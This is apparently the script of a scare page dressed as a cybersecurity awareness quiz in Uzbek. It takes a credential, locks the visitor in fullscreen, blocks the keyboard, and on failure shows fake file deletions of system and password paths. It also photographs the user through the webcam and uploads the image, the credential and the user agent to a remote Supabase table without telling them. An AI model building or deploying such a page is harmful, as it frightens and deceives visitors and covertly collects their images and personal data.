import { supabase } from "./supabase-client.js";

const questions = [
    { q: "Fishing nima?", a: ["Baliq tutish", "Ma'lumotlarni o'g'irlash", "O'yin turi"], c: 1 },
    { q: "Ikki faktorli autentifikatsiya (2FA) xavfsizmi?", a: ["Yo'q", "Faqat SMS bo'lsa", "Ha, juda xavfsiz"], c: 2 },
    { q: "Parol qanday bo'lishi kerak?", a: ["123456", "Ismingiz", "Murakkab va uzun"], c: 2 },
    { q: "Shubhali havolani bossangiz nima bo'ladi?", a: ["Hech narsa", "Virus tushishi mumkin", "Internet tezlashadi"], c: 1 },
    { q: "HTTPS nimani anglatadi?", a: ["Tezkor aloqa", "Xavfsiz ulanish", "Oddiy matn"], c: 1 },
    { q: "Antivirus nega kerak?", a: ["O'yinlar uchun", "Tizimni himoya qilish", "Kino ko'rish uchun"], c: 1 },
    { q: "Ochiq Wi-Fi tarmoqlari xavfsizmi?", a: ["Ha", "Faqat parolsiz bo'lsa", "Yo'q, xavfli bo'lishi mumkin"], c: 2 },
    { q: "Ijtimoiy muhandislik nima?", a: ["Psixologik aldov", "Muhandislik sohasi", "Rasm chizish"], c: 0 },
    { q: "VPN nima uchun ishlatiladi?", a: ["IPni yashirish uchun", "Batareyani tejash uchun", "Xotirani tozalash"], c: 0 },
    { q: "Kiberxavfsizlikning asosiy maqsadi nima?", a: ["Ma'lumotlarni sotish", "Himoya va maxfiylik", "Kompyuterni buzish"], c: 1 }
];

let currentQuestion = 0;
let errors = 0;
let attempts = 1;
let timeLeft = 10;
let timerInterval;
let userData = { credential: "", startTime: "", device: navigator.userAgent };

const screens = document.querySelectorAll('.screen');
const showScreen = (id) => {
    screens.forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
};

// Saytga kirib birinchi marta ekranni bosishi bilan fullscreen rejimiga o'tish
document.addEventListener('click', () => {
    if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().catch(() => {});
    }
}, { once: true });

// 1. Kirish
let firstClick = true;
document.getElementById('start-attack-btn').addEventListener('click', () => {
    if (firstClick) {
        document.getElementById('instruction-text').style.display = 'none';
        document.getElementById('cred-label').style.display = 'block';
        document.getElementById('user-credential').style.display = 'block';
        firstClick = false;
        return;
    }

    const cred = document.getElementById('user-credential').value.trim();
    const credentialError = document.getElementById('credential-error');
    if (!cred) {
        credentialError.innerText = "Zapolnite pole!";
        credentialError.style.display = 'block';
        return;
    }
    credentialError.style.display = 'none';

    userData.credential = cred;
    userData.startTime = new Date().toLocaleString();
    document.documentElement.requestFullscreen();
    showScreen('video-screen');
    initVideo();
});

// 2. Video Player
function initVideo() {
    const playerDiv = document.getElementById('player');
    // Videoni yuklash
    playerDiv.innerHTML = `
        <video id="localVideo" width="100%" height="100%" autoplay muted playsinline style="object-fit: cover;">
            <source src="video.mp4" type="video/mp4">
            Brauzeringiz videoni qo'llab-quvvatlamaydi.
        </video>`;

    const video = document.getElementById('localVideo');
    video.onended = () => {
        if (!document.getElementById('hack-screen').classList.contains('active')) {
            showScreen('hack-screen');
            startQuiz();
        }
    };
}

document.getElementById('after-video-btn').addEventListener('click', () => {
    if (!document.getElementById('hack-screen').classList.contains('active')) {
        showScreen('hack-screen');
        startQuiz();
    }
});

// 3. Test Logikasi
function startQuiz() {
    currentQuestion = 0; // Test boshida savolni qaytadan boshlash
    timeLeft = 10; // Vaqtni qaytadan 10 sekundga sozlash
    loadQuestion();
	timerInterval = setInterval(() => {
        timeLeft--;
        document.getElementById('time-left').innerText = timeLeft;
        if (timeLeft <= 0) failQuiz();
    }, 1000);
}

function loadQuestion() {
    const qData = questions[currentQuestion];
    document.getElementById('question').innerText = qData.q;
    const optionsDiv = document.getElementById('options');
    optionsDiv.innerHTML = '';
    qData.a.forEach((opt, idx) => {
        const btn = document.createElement('button');
        btn.className = 'option-btn';
        btn.innerText = opt;
        btn.onclick = () => checkAnswer(idx);
        optionsDiv.appendChild(btn);
    });
}

function checkAnswer(idx) {
    if (idx === questions[currentQuestion].c) {
        currentQuestion++;
        let progress = (currentQuestion / questions.length) * 100;
        document.querySelector('.progress-fill').style.width = progress + '%';
        document.getElementById('upload-percent').innerText = Math.round(progress);

        if (currentQuestion >= questions.length) {
            clearInterval(timerInterval);
            document.getElementById('warning-sound').pause(); // Stop warning sound on success
            showScreen('result-screen');
            saveData("Muvaffaqiyatli", 100);
            setTimeout(() => { window.location.href = "about:blank"; }, 5000);
        } else {
            timeLeft = 10;
            loadQuestion();
        }
    } else {
        errors++;
        document.getElementById('error-count').innerText = errors;
        if (errors >= 3) failQuiz();
    }
}

function failQuiz() {
    clearInterval(timerInterval);
    showScreen('block-screen');
    initMatrix();
    startWebcam();
    saveData("Bloklandi", 0);
    startFakeDeletion();

    const warningSound = document.getElementById('warning-sound');
    warningSound.play();
    setTimeout(() => {
        warningSound.pause();
        warningSound.currentTime = 0;
    }, 60000); // 1 daqiqadan keyin ovozni to'xtatish
}

// 4. Matrix & Webcam
function initMatrix() {
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#f00"; // Qizil rangga o'zgartirildi
        ctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const text = letters.charAt(Math.floor(Math.random() * letters.length));
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(draw, 33);
}

async function startWebcam() {
    const video = document.getElementById('webcam');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.style.display = 'block';
        video.srcObject = stream;
        // Snapshot olish (5 soniyadan keyin)
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const snapshot = canvas.toDataURL('image/png');
            updateSnapshot(snapshot);
        }, 5000);
    } catch (err) {
        console.log("Kameraga ruxsat berilmadi");
    }
}

function startFakeDeletion() {
    const list = document.getElementById('fake-deletion');
    const files = ["C:/Windows/System32", "D:/Rasmlar/Shaxsiy", "C:/Users/Desktop/Parollar.txt", "Telegram/Sessions"];
    let i = 0;
    setInterval(() => {
        if (i < files.length) {
            const p = document.createElement('p');
            p.innerText = "Deleting: " + files[i++];
            list.appendChild(p);
        }
    }, 1500);
}

// 5. Ma'lumotlarni saqlash
async function saveData(status, score) {
    const entry = {
        ...userData,
        status: status,
        score: score,
        ip: "192.168." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255), // Simulyatsiya
        webcam: ""
    };

    const { data, error } = await supabase
        .from('logs')
        .insert(entry)
        .select('id')
        .single();

    if (error) {
        console.error("Supabase insert xatosi:", error.message);
        return;
    }

    userData.currentId = data.id;
}

async function updateSnapshot(imgData) {
    if (userData.currentId) {
        const { error } = await supabase
            .from('logs')
            .update({ webcam: imgData })
            .eq('id', userData.currentId);

        if (error) {
            console.error("Supabase update xatosi:", error.message);
        }
    }
}

// Klaviatura blokirovkasi simulyatsiyasi
const isAttackInProgress = () => {
    return document.getElementById('video-screen').classList.contains('active') ||
        document.getElementById('hack-screen').classList.contains('active') ||
        document.getElementById('block-screen').classList.contains('active');
};

window.addEventListener('keydown', (e) => {
    if (isAttackInProgress()) {
        e.preventDefault();
        const warn = document.getElementById('kbd-warning');
        warn.style.display = 'block';
        setTimeout(() => warn.style.display = 'none', 1000);
    }
});

// Timer (Matrix ekrani uchun)
let blockTime = 60; // 1 minutga tushirildi
setInterval(() => {
    if (document.getElementById('block-screen').classList.contains('active')) {
        if (blockTime <= 0) {
            location.reload(); // Vaqt tugagach sahifani yangilash (restart)
            return;
        }
        blockTime--;
        const m = Math.floor(blockTime / 60);
        const s = blockTime % 60;
        document.getElementById('timer').innerText = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    }
}, 1000);

// Exit fullscreen on success screen
document.getElementById('exit-fullscreen-btn').addEventListener('click', () => {
    if (document.fullscreenElement) {
        document.exitFullscreen();
    }
    // Optionally, show a final message or redirect
    alert("Kiberxujum yakunlandi. Tizim xavfsiz holatga qaytarildi.");
});

// Fullscreen rejimidan chiqishni taqiqlash va avtomatik qaytarish
document.addEventListener('fullscreenchange', () => {
    // Agar foydalanuvchi fullscreendan chiqsa va hujum hali tugamagan bo'lsa
    if (!document.fullscreenElement && isAttackInProgress()) {
        // Brauzer xavfsizligi uchun ba'zan rad etilishi mumkin, 
        // lekin biz qayta urinib ko'ramiz
        document.documentElement.requestFullscreen().catch(err => {
            console.warn("Fullscreen avtomatik qayta tiklanmadi. Foydalanuvchi harakati kutilmoqda.");
        });
    }
});
